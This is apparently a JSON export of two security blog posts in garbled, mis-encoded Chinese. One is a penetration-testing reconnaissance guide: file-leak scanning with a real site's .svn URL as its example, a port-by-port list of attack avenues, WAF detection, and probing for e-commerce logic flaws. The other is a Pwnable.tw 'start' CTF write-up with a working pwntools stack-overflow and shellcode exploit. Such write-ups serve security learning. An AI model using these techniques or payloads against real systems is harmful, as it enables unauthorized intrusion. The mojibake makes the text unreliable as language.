æ•æ„Ÿä¿¡æ¯æ”¶é›†ç”¨æ‰«æå™¨æ‰«æç›®å½•ï¼Œè¿™æ—¶å€™ä½ éœ€è¦ä¸€æœ¬å¼ºå¤§çš„å­—å…¸ï¼Œé‡åœ¨å¹³æ—¶ç§¯ç´¯ã€‚å­—å…¸è¶Šå¼ºæ‰«æå¤„çš„ç»“æœå¯èƒ½è¶Šå¤šã€‚å¸¸è§æœ‰.gitæ–‡ä»¶æ³„éœ²ï¼Œ.svnæ–‡ä»¶æ³„éœ²ï¼Œ.DB_storeæ–‡ä»¶æ³„éœ²ï¼ŒWEB-INF/web.xmlæ³„éœ²ã€‚ç›®å½•æ‰«ææœ‰ä¸¤ç§æ–¹å¼ï¼Œä½¿ç”¨ç›®å½•å­—å…¸è¿›è¡Œæš´åŠ›æ‰æ¥å­˜åœ¨è¯¥ç›®å½•æˆ–æ–‡ä»¶è¿”å›200æˆ–è€…403ï¼›ä½¿ç”¨çˆ¬è™«çˆ¬è¡Œä¸»é¡µä¸Šçš„æ‰€æœ‰é“¾æ¥ï¼Œå¯¹æ¯ä¸ªé“¾æ¥è¿›è¡Œå†æ¬¡çˆ¬è¡Œï¼Œæ”¶é›†è¿™ä¸ªåŸŸåä¸‹çš„æ‰€æœ‰é“¾æ¥ï¼Œç„¶åæ€»ç»“å‡ºéœ€è¦çš„ä¿¡æ¯ã€‚è·¯å¾„fuzzï¼š https://github.com/ring04h/weakfilescanæ•æ„Ÿæ–‡ä»¶æ‰«æ: https://github.com/Mosuan/FileScanwebæ¨¡ç³Šæµ‹è¯•: https://github.com/xmendez/wfuzz githubé¡¹ç›®GitPreyæ˜¯æ ¹æ®ä¼ä¸šå…³é”®è¯è¿›è¡Œé¡¹ç›®æ£€ç´¢ä»¥åŠç›¸åº”æ•æ„Ÿæ–‡ä»¶å’Œæ•æ„Ÿæ–‡ä»¶å†…å®¹æ‰«æçš„å·¥å…· https://github.com/repoog/GitPrey svn æ³„æ¼svn æ–‡ä»¶æ˜¯ subversion çš„ç‰ˆæœ¬æ§åˆ¶ä¿¡æ¯æ–‡ä»¶ å½“æŸä¸ªç›®å½•å¤„äº subversion çš„ç‰ˆæœ¬æ§åˆ¶æ—¶ï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸­å°±ä¼š .svn è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿™ä¸ª .svn æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶å°±æ˜¯ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯æ–‡ä»¶ï¼Œä¾› subversion ä½¿ç”¨ã€‚ç”±äºéƒ¨ç½²ä¸Šçº¿çš„æ—¶å€™æ²¡æœ‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œå¯¼è‡´ä»£ç æ³„æ¼ã€‚https://i.mi.com//.svn/entries æ•æ„Ÿæ–‡ä»¶ DS_Store æ–‡ä»¶æ³„éœ² https://github.com/lijiejie/ds_store_exp å¤‡ä»½æ–‡ä»¶ WEB-INFæ³„éœ² WEB-INF æ˜¯ Java çš„ WEB åº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡ web.xml æ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚ æµ‹è¯•æ–‡ä»¶ phpinfo æ•æ„Ÿç›®å½•ï¼šç½‘ç«™åå°ç›®å½•ï¼ä¸€äº›ç™»å½•åœ°å€ï¼ä¸€äº›æ¥å£ç›®å½• ç«¯å£ä¿¡æ¯https://github.com/ring04h/wyportmapæœåŠ¡å’Œå®‰å…¨æ˜¯ç›¸å¯¹åº”çš„ï¼Œæ¯å¼€å¯ä¸€ä¸ªç«¯å£ï¼Œé‚£ä¹ˆæ”»å‡»é¢å°±å¤§äº†ä¸€ç‚¹ï¼Œå¼€å¯çš„ç«¯å£è¶Šå¤šï¼Œä¹Ÿå°±æ„å‘³ç€æœåŠ¡å™¨é¢ä¸´çš„å¨èƒè¶Šå¤§ã€‚å¼€å§‹æ‰«æä¹‹å‰ä¸å¦¨ä½¿ç”¨telnetå…ˆç®€å•æ¢æµ‹ä¸‹æŸäº›ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œé¿å…ä½¿ç”¨æ‰«æå™¨è€Œè¢«å°IPï¼Œæ‰«æå…¨ç«¯å£ä¸€èˆ¬ä½¿ç”¨Nmapï¼Œmasscanè¿›è¡Œæ‰«ææ¢æµ‹ï¼Œå°½å¯èƒ½å¤šçš„æœé›†å¼€å¯çš„ç«¯å£å¥½å·²ç»å¯¹åº”çš„æœåŠ¡ç‰ˆæœ¬ï¼Œå¾—åˆ°ç¡®åˆ‡çš„æœåŠ¡ç‰ˆæœ¬åå¯ä»¥æœç´¢æœ‰æ²¡æœ‰å¯¹åº”ç‰ˆæœ¬çš„æ¼æ´ã€‚ç«¯å£æ¸—é€è¿‡ç¨‹ä¸­æˆ‘ä»¬éœ€è¦å…³æ³¨å‡ ä¸ªé—®é¢˜ï¼š ç«¯å£çš„bannerä¿¡æ¯ ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ å¸¸è§åº”ç”¨çš„é»˜è®¤ç«¯å£ ç«¯å£å· ç«¯å£æœåŠ¡/åè®®ç®€è¦è¯´æ˜ å…³äºç«¯å£å¯èƒ½çš„ä¸€äº›æ¸—é€ç”¨é€” tcp 20,21 ftp é»˜è®¤çš„æ•°æ®å’Œå‘½ä»¤ä¼ è¾“ç«¯å£[å¯æ˜æ–‡äº¦å¯åŠ å¯†ä¼ è¾“] å…è®¸åŒ¿åçš„ä¸Šä¼ ä¸‹è½½,çˆ†ç ´,å—…æ¢,winææƒ,è¿œç¨‹æ‰§è¡Œ(proftpd 1.3.5),å„ç±»åé—¨(proftpd,vsftp 2.3.4) tcp 22 ssh[æ•°æ®sslåŠ å¯†ä¼ è¾“] å¯æ ¹æ®å·²æœé›†åˆ°çš„ä¿¡æ¯å°è¯•çˆ†ç ´,v1ç‰ˆæœ¬å¯ä¸­é—´äºº,sshéš§é“åŠå†…ç½‘ä»£ç†è½¬å‘,æ–‡ä»¶ä¼ è¾“,ç­‰ç­‰â€¦å¸¸ç”¨äºlinuxè¿œç¨‹ç®¡ç†â€¦ tcp 23 telnet[æ˜æ–‡ä¼ è¾“] çˆ†ç ´,å—…æ¢,ä¸€èˆ¬å¸¸ç”¨äºè·¯ç”±,äº¤æ¢ç™»é™†,å¯å°è¯•å¼±å£ä»¤,ä¹Ÿè®¸ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„æ”¶è· tcp 25 smtp[ç®€å•é‚®ä»¶ä¼ è¾“åè®®,å¤šæ•°linuxå‘è¡Œç‰ˆå¯èƒ½ä¼šé»˜è®¤å¼€å¯æ­¤æœåŠ¡] é‚®ä»¶ä¼ªé€ ,vrfy/expn æŸ¥è¯¢é‚®ä»¶ç”¨æˆ·ä¿¡æ¯,å¯ä½¿ç”¨smtp-user-enumå·¥å…·æ¥è‡ªåŠ¨è·‘ tcp/udp 53 dns[åŸŸåè§£æ] å…è®¸åŒºåŸŸä¼ é€,dnsåŠ«æŒ,ç¼“å­˜æŠ•æ¯’,æ¬ºéª—ä»¥åŠå„ç§åŸºäºdnséš§é“çš„è¿œæ§ tcp/udp 69 tftp[ç®€å•æ–‡ä»¶ä¼ è¾“åè®®,æ— è®¤è¯] å°è¯•ä¸‹è½½ç›®æ ‡åŠå…¶çš„å„ç±»é‡è¦é…ç½®æ–‡ä»¶ tcp 80-89,443,8440-8450,8080-8089 web[å„ç§å¸¸ç”¨çš„webæœåŠ¡ç«¯å£] å„ç§å¸¸ç”¨webæœåŠ¡ç«¯å£,å¯å°è¯•ç»å…¸çš„top n,vpn,owa,webmail,ç›®æ ‡oa,å„ç±»javaæ§åˆ¶å°,å„ç±»æœåŠ¡å™¨webç®¡ç†é¢æ¿,å„ç±»webä¸­é—´ä»¶æ¼æ´åˆ©ç”¨,å„ç±»webæ¡†æ¶æ¼æ´åˆ©ç”¨ç­‰ç­‰â€¦â€¦ tcp 110 [é‚®å±€åè®®,å¯æ˜æ–‡å¯å¯†æ–‡] å¯å°è¯•çˆ†ç ´,å—…æ¢ tcp 137,139,445 samba[smbå®ç°windowså’Œlinuxé—´æ–‡ä»¶å…±äº«,æ˜æ–‡] å¯å°è¯•çˆ†ç ´ä»¥åŠsmbè‡ªèº«çš„å„ç§è¿œç¨‹æ‰§è¡Œç±»æ¼æ´åˆ©ç”¨,å¦‚,ms08-067,ms17-010,å—…æ¢ç­‰â€¦â€¦ tcp 143 imap[å¯æ˜æ–‡å¯å¯†æ–‡] å¯å°è¯•çˆ†ç ´ udp 161 snmp[æ˜æ–‡] çˆ†ç ´é»˜è®¤å›¢é˜Ÿå­—ç¬¦ä¸²,æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯ tcp 389 ldap[è½»é‡çº§ç›®å½•è®¿é—®åè®®] ldapæ³¨å…¥,å…è®¸åŒ¿åè®¿é—®,å¼±å£ä»¤ tcp 512,513,514 linux rexec å¯çˆ†ç ´,rloginç™»é™† tcp 873 rsyncå¤‡ä»½æœåŠ¡ åŒ¿åè®¿é—®,æ–‡ä»¶ä¸Šä¼  tcp 1194 openvpn æƒ³åŠæ³•é’“vpnè´¦å·,è¿›å†…ç½‘ tcp 1352 Lotus dominoé‚®ä»¶æœåŠ¡ å¼±å£ä»¤,ä¿¡æ¯æ³„æ¼,çˆ†ç ´ tcp 1433 mssqlæ•°æ®åº“ æ³¨å…¥,ææƒ,saå¼±å£ä»¤,çˆ†ç ´ tcp 1521 oracleæ•°æ®åº“ tnsçˆ†ç ´,æ³¨å…¥,å¼¹shellâ€¦ tcp 1500 ispmanager ä¸»æœºæ§åˆ¶é¢æ¿ å¼±å£ä»¤ tcp 1025,111,2049 nfs æƒé™é…ç½®ä¸å½“ tcp 1723 pptp çˆ†ç ´,æƒ³åŠæ³•é’“vpnè´¦å·,è¿›å†…ç½‘ tcp 2082,2083 cpanelä¸»æœºç®¡ç†é¢æ¿ç™»å½• å¼±å£ä»¤ tcp 2181 zookeeper æœªæˆæƒè®¿é—® tcp 2601,2604 zebraè·¯ç”± é»˜è®¤å¯†ç zerbra tcp 3128 squidä»£ç†æœåŠ¡ å¼±å£ä»¤ tcp 3312,3311 kangleä¸»æœºç®¡ç†ç™»å½• å¼±å£ä»¤ tcp 3306 mysqlæ•°æ®åº“ æ³¨å…¥,ææƒ,çˆ†ç ´ tcp 3389 windows rdpè¿œç¨‹æ¡Œé¢ shiftåé—¨[éœ€è¦03ä»¥ä¸‹çš„ç³»ç»Ÿ],çˆ†ç ´,ms12-020[è“å±exp] tcp 4848 glassfishæ§åˆ¶å° å¼±å£ä»¤ tcp 4899 radminè¿œç¨‹æ¡Œé¢ç®¡ç†å·¥å…·,ç°åœ¨å·²ç»éå¸¸éå¸¸å°‘äº† æŠ“å¯†ç æ‹“å±•æœºå™¨ tcp 5000 sybase/DB2æ•°æ®åº“ çˆ†ç ´,æ³¨å…¥ tcp 5432 postgresqlæ•°æ®åº“ çˆ†ç ´,æ³¨å…¥,å¼±å£ä»¤ tcp 5632 pcanywhereè¿œç¨‹æ¡Œé¢ç®¡ç†å·¥å…· æŠ“å¯†ç ,ä»£ç æ‰§è¡Œ,å·²ç»å¿«é€€å‡ºå†å²èˆå°äº† tcp 5900,5901,5902 vncè¿œç¨‹æ¡Œé¢ç®¡ç†å·¥å…· å¼±å£ä»¤çˆ†ç ´,å¦‚æœä¿¡æ¯æœé›†ä¸åˆ°ä½,æˆåŠŸå‡ ç‡å¾ˆå° tcp 5984 CouchDB æœªæˆæƒå¯¼è‡´çš„ä»»æ„æŒ‡ä»¤æ‰§è¡Œ tcp 6379 redisæœªæˆæƒ å¯å°è¯•æœªæˆæƒè®¿é—®,å¼±å£ä»¤çˆ†ç ´ tcp 7001,7002 weblogicæ§åˆ¶å° javaååºåˆ—åŒ–,å¼±å£ä»¤ tcp 7778 kloxo ä¸»æœºé¢æ¿ç™»å½• tcp 8000 Ajentiä¸»æœºæ§åˆ¶é¢æ¿ å¼±å£ä»¤ tcp 8443 pleskä¸»æœºæ§åˆ¶é¢æ¿ å¼±å£ä»¤ tcp 8069 zabbix è¿œç¨‹æ‰§è¡Œ,sqlæ³¨å…¥ tcp 8080-8089 Jenkins,jboss ååºåˆ—åŒ–,æ§åˆ¶å°å¼±å£ä»¤ tcp 9080-9081,9090 websphereæ§åˆ¶å° javaååºåˆ—åŒ–/å¼±å£ä»¤ tcp 9200,9300 elasticsearch è¿œç¨‹æ‰§è¡Œ tcp 10000 webmin linuxä¸»æœºwebæ§åˆ¶é¢æ¿å…¥å£ å¼±å£ä»¤ tcp 11211 memcached æœªæˆæƒè®¿é—® tcp 27017,27018 mongodb çˆ†ç ´,æœªæˆæƒè®¿é—® tcp 3690 svnæœåŠ¡ svnæ³„éœ²,æœªæˆæƒè®¿é—® tcp 50000 SAP Management Console è¿œç¨‹æ‰§è¡Œ tcp 50070,50030 hadoop é»˜è®¤ç«¯å£æœªæˆæƒè®¿é—® WAFæ£€æµ‹ waf00fï¼šæ˜¯kaliä¸‹çš„è¯†åˆ«WAFçš„è€å·¥å…· https://github.com/Ekultek/WhatWaf waf00f mi.com ä»ä¹Œäº‘é•œåƒç«™ã€CNVDæœé›†ç½‘ç«™å†å²æ¼æ´ SQLMAPè‡ªå¸¦çš„WAFè¯†åˆ«åŠŸèƒ½ï¼Œæˆ‘ç§»æ¤å‡ºæ¥äº†ï¼Œå¯ä»¥è‡ªå®šä¹‰æ–°è§„åˆ™ã€‚å‘å¸ƒåœ¨T00ls https://www.t00ls.net/thread-46639-1-1.html ä½¿ç”¨äº‘æ‚‰ä¹Ÿå¯ä»¥æŸ¥è¯¢å‡ºWAF è¾“å…¥ä¸€ä¸ªé”™è¯¯çš„é¡µé¢ï¼ŒæŸ¥çœ‹è¿”å›çš„å¤´éƒ¨ä¿¡æ¯æˆ–è€…bodyä¿¡æ¯ å°ç»“é€šè¿‡æœç´¢å¼•æ“è·å–ç³»ç»Ÿç®¡ç†é¡µé¢ï¼Œç›´æ¥è¶Šæƒè®¿é—®ï¼›é€šè¿‡githubç›´æ¥æ‰¾åˆ°ç®¡ç†åå°è´¦å·å¯†ç ï¼›é€šè¿‡ç›®å½•ï¼æ–‡ä»¶æ‰«æç›´æ¥å¾—åˆ°ç³»ç»Ÿä¿¡æ¯ï¼ˆipã€ç®¡ç†å‘˜è´¦å·å¯†ç ï¼‰è¿å…¥æœåŠ¡å™¨ï¼› 0x02 ä¿¡æ¯å¤„ç† ä¿¡æ¯æ•´ç†åˆ†ç±»ï¼š å“ªäº›ç½‘ç«™åŠŸèƒ½ç±»ä¼¼ï¼› å“ªäº›ç½‘ç«™å¯èƒ½ä½¿ç”¨çš„åŒä¸€æ¨¡ç‰ˆï¼› å“ªäº›ç½‘ç«™æœ‰wafï¼ˆè¿™ä¸ªä¸€èˆ¬åœ¨urlä¸­æ ‡æ˜å°±å¥½ï¼‰ï¼› å“ªäº›ç½‘ç«™èƒ½ç™»å½•ï¼ˆæ³¨å†Œçš„è´¦å·ä¹Ÿä¸€å®šè¦è®°ä½ï¼Œæœ€å¥½å¯ä»¥å‡†å¤‡ä¸¤ä¸ªæ‰‹æœºå·ï¼Œä¸¤ä¸ªé‚®ç®±æ–¹ä¾¿æ³¨å†Œï¼‰ï¼› å“ªäº›ç½‘ç«™æš´éœ²è¿‡å“ªäº›ç±»å‹çš„æ¼æ´ï¼ˆè¿™ä¸ªåªèƒ½å»ä¹Œäº‘ä¸Šé¢æ‰¾ï¼‰ï¼› ç½‘ç«™ç›®å‰æœ‰å“ªäº›åŠŸèƒ½ï¼ˆè¿™ä¸ªç¨å¾®å…³æ³¨ä¸€ä¸‹ç½‘ç«™å…¬å‘Šï¼Œçœ‹æœ€è¿‘æ˜¯å¦ä¼šæœ‰ä¸šåŠ¡æ›´è¿­ï¼‰ï¼› æ¼æ´æ•´ç† 0x03 æ¼æ´æŒ–æ˜owasp top 10ã€é€»è¾‘ é¦–å…ˆæˆ‘ä»¬éœ€è¦å¯¹ä¸€ä¸ªç½‘ç«™ï¼appæœ‰ä¸€ä¸ªäº†è§£è¦çŸ¥é“å®ƒçš„åŠŸèƒ½ç‚¹æœ‰å“ªäº› å…¶æ¬¡æˆ‘ä»¬è¦åˆ†æè¿™ä¸ªç½‘ç«™ï¼appé‡Œé¢çš„è¯·æ±‚å“ªäº›æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å‚æ•°ï¼Œè¿™äº›åœ°æ–¹å°±æ˜¯æ¼æ´ç»å¸¸å‡ºæ²¡çš„ç‚¹ æœ€åå°±æ˜¯åˆ†æé€»è¾‘ ä¾‹ï¼šâ€æˆ‘ä»¬ä¹°ä¸œè¥¿â€ é¦–å…ˆæˆ‘ä»¬è¦é€‰æ‹©ï¼šç­›é€‰æ¶‰åŠæŸ¥è¯¢ï¼ˆæ˜¯å¦å¯ä»¥SQLæ³¨å…¥ï¼‰ åŠ å…¥è´­ç‰©è½¦ï¼šå•†å“æ•°é‡æ˜¯å¦å¯ä»¥ä¸ºè´Ÿ è¯¢é—®å•†å®¶ï¼šè·³è½¬å®¢æœç³»ç»Ÿï¼Œè·³è½¬urlä¸­æ˜¯å¦å«æœ‰ç”¨æˆ·å‚æ•°xssæ‰“å®¢æœcookieé’“é±¼+ç¤¾å·¥ ä¸‹å•ï¼šå¡«åœ°å€ï¼Œæ¶‰åŠæ’å…¥ï¼ˆæ³¨å…¥ï¼‰ã€xssä¿®æ”¹å•ä»·ä¿®æ”¹æ€»é¢ï¼ˆè¿™é‡Œè¯´æ˜ä¸€ä¸‹ä¿®æ”¹æ€»é¢ï¼šæƒ…å†µ1ï¼Œå°±æ˜¯æˆ‘ä»¬å¯èƒ½ä¼šé‡åˆ°å¯ä»¥ä½¿ç”¨ä¼˜æƒ å·çš„æƒ…å†µï¼Œæ¯”å¦‚æˆ‘ä»¬ä¹°äº†100çš„ä¸œè¥¿åªèƒ½ä½¿ç”¨5å—çš„ä¼˜æƒ ä»·ï¼Œä½†æ˜¯æˆ‘æœ‰ä¸€å¼ 50çš„ä¼˜æƒ å·æ˜¯å¦å¯ä»¥ä½¿ç”¨ï¼›æƒ…å†µ2ï¼Œæ‰“æŠ˜æˆ‘ä»¬æ˜¯å¦å¯ä»¥ä¿®æ”¹æ‰“æŠ˜çš„æŠ˜æ‰£ï¼›æƒ…å†µ3ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥ä¿®æ”¹è¿è´¹ï¼Œå°†è¿è´¹æ”¹ä¸ºè´Ÿæ•°ï¼›æƒ…å†µnï¼‰ å¤‡æ³¨ï¼šxssï¼Œsqlæ³¨å…¥ ç”µå­ç¥¨æ®ï¼šä¼šå†™æŠ¬å¤´ æ”¯ä»˜ï¼šä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦å¯ä»¥ä¿®æ”¹ï¼Œå¦‚æœæ˜¯æ‰«æäºŒç»´ç æ”¯ä»˜ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æä¸€ä¸‹äºŒç»´ç ä¸­çš„è¯·æ±‚urlçœ‹æ˜¯å¦å¯ä»¥ä¿®æ”¹ä»¥åé‡æ–°ç”ŸæˆäºŒç»´ç ï¼ˆè¿™é‡Œä¸è®¨è®ºåé¢å…·ä½“äº†æ”¯ä»˜äº†ï¼Œå› ä¸ºå¾®ä¿¡å’Œæ”¯ä»˜å®ï¼‰ è®¢å•å®Œæˆï¼šæ˜¯å¦å¯ä»¥éå†è®¢å• è¯„ä»·ï¼šæ³¨å…¥ã€ä¸Šä¼ å›¾ç‰‡ã€xss","categories":[{"name":"web","slug":"web","permalink":"https://cool-y.github.io/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://cool-y.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://cool-y.github.io/tags/ctf/"}]},{"title":"ã€Pwnable.twã€‘start","slug":"PWNtw-start","date":"2019-10-25T13:04:14.000Z","updated":"2021-04-10T13:46:47.397Z","comments":true,"path":"2019/10/25/PWNtw-start/","link":"","permalink":"https://cool-y.github.io/2019/10/25/PWNtw-start/","excerpt":"","text":"Pwnable.tw startç¨‹åºé“¾æ¥ï¼šhttps://pwnable.tw/static/chall/start 0x01 æ£€æŸ¥ä¿æŠ¤æƒ…å†µä¸å¾—ä¸è¯´ï¼Œchecksecè¿™ä¸ªå·¥ä½œçœ‹ä¼¼ç®€å•ï¼Œç”¨ç”¨ç°æˆå·¥å…·å°±è¡Œï¼Œä½†è¿™å†³å®šäº†æˆ‘ä»¬ä¹‹åæ¼æ´åˆ©ç”¨çš„æ–¹å¼ï¼Œæ˜¯å¦æ ˆä»£ç æ‰§è¡Œï¼Œè¿˜æ˜¯ROPã€‚æœ€å¥½å¤šç”¨å‡ ä¸ªå·¥å…·è¿›è¡Œæ£€æŸ¥ï¼Œå…¼å¬åˆ™æ˜ã€‚æ¯”å¦‚è¿™ä¸ªç¨‹åºç”¨pedaæ£€æŸ¥å°±å¼€å¯äº†NXï¼Œä½†å®é™…ä¸Šå¹¶æ²¡æœ‰ã€‚æ‰€ä»¥ç†æƒ³çš„è¯ï¼ŒæŠŠshellcodeå¸ƒç½®åˆ°æ ˆä¸Šå°±å¯ä»¥äº†ï¼ 123456$ checksec ./start Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RELRO(Relocation Read Only)ï¼šå°½é‡ä½¿å­˜å‚¨åŒºåŸŸåªè¯» 0x02 æ¼æ´åˆ†æç”¨IDAé€†å‘åˆ†æï¼Œæ±‡ç¼–ä»£ç  12345678910111213141516171819202122232425262728293031323334ä¿å­˜ç°åœºç¯å¢ƒespã€_exit.text:08048060 push esp.text:08048061 push offset _exitæ¸…ç©ºå¯„å­˜å™¨EAX EBX ECX EDX.text:08048066 xor eax, eax.text:08048068 xor ebx, ebx.text:0804806A xor ecx, ecx.text:0804806C xor edx, edxå‘æ ˆä¸Šå‹å…¥å‚æ•°.text:0804806E push 3A465443h CTF:.text:08048073 push 20656874h the.text:08048078 push 20747261h art.text:0804807D push 74732073h s st.text:08048082 push 2774654Ch Letâ€™ç³»ç»Ÿè°ƒç”¨80h.text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h ; LINUX - sys_writeç³»ç»Ÿè°ƒç”¨80h.text:08048091 xor ebx, ebx.text:08048093 mov dl, 3Ch.text:08048095 mov al, 3.text:08048097 int 80h ; LINUX -æ¢å¤æ ˆå¹³è¡¡ï¼Œè¿”å›åˆ°_exit.text:08048099 add esp, 14h.text:0804809C retn.text:0804809C _start endp ; sp-analysis failed INT 80h ç³»ç»Ÿè°ƒç”¨æ–¹æ³•ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š1ï¼ æ‰§è¡Œç”¨æˆ·ç¨‹åº(å¦‚:fork)2ï¼ æ ¹æ®glibcä¸­çš„å‡½æ•°å®ç°ï¼Œå–å¾—ç³»ç»Ÿè°ƒç”¨å·å¹¶æ‰§è¡Œint $0x80äº§ç”Ÿä¸­æ–­ã€‚3ï¼ è¿›è¡Œåœ°å€ç©ºé—´çš„è½¬æ¢å’Œå †æ ˆçš„åˆ‡æ¢ï¼Œæ‰§è¡ŒSAVE_ALLã€‚ï¼ˆè¿›è¡Œå†…æ ¸æ¨¡å¼ï¼‰4ï¼ è¿›è¡Œä¸­æ–­å¤„ç†ï¼Œæ ¹æ®ç³»ç»Ÿè°ƒç”¨è¡¨è°ƒç”¨å†…æ ¸å‡½æ•°ã€‚5ï¼ æ‰§è¡Œå†…æ ¸å‡½æ•°ã€‚6ï¼ æ‰§è¡ŒRESTORE_ALLå¹¶è¿”å›ç”¨æˆ·æ¨¡å¼Linux 32ä½çš„ç³»ç»Ÿè°ƒç”¨æ—¶é€šè¿‡int 80hæ¥å®ç°çš„ï¼Œeaxå¯„å­˜å™¨ä¸­ä¸ºè°ƒç”¨çš„åŠŸèƒ½å·ï¼Œebxã€ecxã€edxã€esiç­‰ç­‰å¯„å­˜å™¨åˆ™ä¾æ¬¡ä¸ºå‚æ•°ã€‚ å…³äºç³»ç»Ÿè°ƒç”¨çš„åŠŸèƒ½å·ï¼š 1234567891011#define __NR_exit 1#define __NR_fork 2#define __NR_read 3#define __NR_write 4#define __NR_open 5#define __NR_close 6#define __NR_waitpid 7#define __NR_creat 8#define __NR_link 9#define __NR_unlink 10#define __NR_execve 11 ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼šå°†espå¼€å§‹çš„14hå­—èŠ‚æ•°æ®å†™å…¥æ ‡å‡†è¾“å‡ºï¼ˆæ–‡ä»¶æè¿°ç¬¦1ï¼‰ï¼Œå³è¾“å‡ºâ€Letâ€™s start the CTF:â€œ name eax ebx ecx edx sys_write 0x04 unsigned int fd = 1 const char __user *buf = esp size_t count =14h â€” â€” â€” â€” â€” ç¬¬äºŒä¸ªç³»ç»Ÿè°ƒç”¨ï¼šä»æ ‡å‡†è¾“å…¥è¯»å–3chå­—èŠ‚åˆ°æ ˆç©ºé—´ name eax ebx ecx edx sys_read 0x03 unsigned int fd = 1 char __user *buf = esp size_t count = 3ch â€” â€” â€” â€” â€” æ ˆå˜åŒ–æƒ…å†µ ç¨‹åºæ‰§è¡Œåˆ°0804808Fï¼šsys_write è¾“å‡º14hå­—èŠ‚æ•°æ®ï¼šLetâ€™s start the CTF: 123456789101112131415 +-----------------+ &lt;---- | Letâ€™ | | +-----------------+ | | s st | | +-----------------+ | | art | 14h +-----------------+ | | the | | +-----------------+ | | CTF: | | +-----------------+ &lt;----- | offset _exit | +-----------------+ | Saved ESP |H-&gt; +-----------------+ 08048097: sys_read readå‡½æ•°æœ€å¤šå¯ä»¥è¯»å–3chå­—èŠ‚ï¼Œè¶…å‡ºäº†åˆ†é…çš„ç©ºé—´ï¼Œå¯ä»¥ç”¨æ¥è¦†ç›–ret_addrå’Œespã€‚ç»è°ƒè¯•éªŒè¯ï¼Œ20å­—èŠ‚åè¦†ç›–retï¼Œ24å­—èŠ‚åè¦†ç›–espã€‚ 123456789gdb-peda$ pattern searchRegisters contain pattern buffer:EIP+0 found at offset: 20Registers point to pattern buffer:[ECX] --&gt; offset 0 - size ~32[ESP] --&gt; offset 24 - size ~8Pattern buffer found at:0xffcc2764 : offset 0 - size 30 ($sp + -0x18 [-6 dwords])Reference to pattern buffer not found in memory 123456789101112131415 +-----------------+ &lt;---- | aaaa | | +-----------------+ | | aaaa | | +-----------------+ | | aaaa | 14h +-----------------+ | | aaaa | | +-----------------+ | | aaaa | | +-----------------+ &lt;----- | aaaa | +-----------------+ | Saved ESP |H-&gt; +-----------------+ 0x03 æ¼æ´åˆ©ç”¨åˆ©ç”¨æ€è·¯ç°åœ¨EIPå·²ç»åœ¨æˆ‘ä»¬çš„æŒæ§ä¹‹ä¸­äº†ï¼Œå…³é”®æ˜¯å¦‚ä½•è·³è½¬åˆ°å¸ƒç½®çš„shell codeä¸­ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé¦–å…ˆä¼šå»æ‰¾JMP ESPæŒ‡ä»¤ï¼Œè¿™æ ·å°±èƒ½è®©shellcodeè·å¾—æ‰§è¡Œã€‚ä½†è¿™æ®µæ±‡ç¼–ä»£ç æ²¡æœ‰ï¼Œå¯ä»¥åˆ©ç”¨çš„åªæœ‰readå’Œwriteã€‚å¦‚æœå¯ä»¥writeå‡ºSaved ESPçš„åœ°å€ï¼Œç„¶åè¦†ç›–æ‰offset _exitï¼Œå°±èƒ½æˆåŠŸshellã€‚ æ³„éœ²Saved ESP 1234start = p.recvuntil(':') //ç­‰å¾…writeæ‰§è¡Œå®Œæ¯•payload = 'a'*0x14 + p32(0x08048087) //å‘é€æº¢å‡ºæ•°æ®ï¼Œè¦†ç›–retä¸º0x08048087-&gt;è¾“å‡º14hå­—èŠ‚p.send(payload)data = p.recv() //æ¥æ”¶è¾“å‡ºæ•°æ®ï¼Œå…¶ä¸­å°±æœ‰Saved ESP debugè¿‡ç¨‹ï¼š 12345678910[DEBUG] Received 0x14 bytes: \"Let's start the CTF:\"[DEBUG] Sent 0x18 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 â”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚ 00000010 61 61 61 61 87 80 04 08 â”‚aaaaâ”‚Â·Â·Â·Â·â”‚â”‚ 00000018[DEBUG] Received 0x14 bytes: 00000000 **20 53 81**** ff** 01 00 00 00 58 6d 81 ff 00 00 00 00 â”‚ SÂ·Â·â”‚Â·Â·Â·Â·â”‚XmÂ·Â·â”‚Â·Â·Â·Â·â”‚ 00000010 60 6d 81 ff â”‚`mÂ·Â·â”‚â”‚ 00000014 è¦†ç›–RET æ­¤æ—¶ç¨‹åºå·²ç»æ³„éœ²å‡ºä¹‹å‰çš„Saved_espï¼Œæ ˆçš„æƒ…å†µå·²ç»æ‘¸æ¸…äº†ï¼Œç„¶åç¨‹åºç»§ç»­æ‰§è¡Œreadï¼Œæ³¨æ„readå®Œ add esp, 14håå†retï¼Œå› æ­¤ï¼Œret_addråœ¨esp+14hçš„åœ°æ–¹ã€‚ 123payload = 'a'*0x14 + p32(saved_esp + 20) + shellcodeprint p32(saved_esp)p.send(payload) 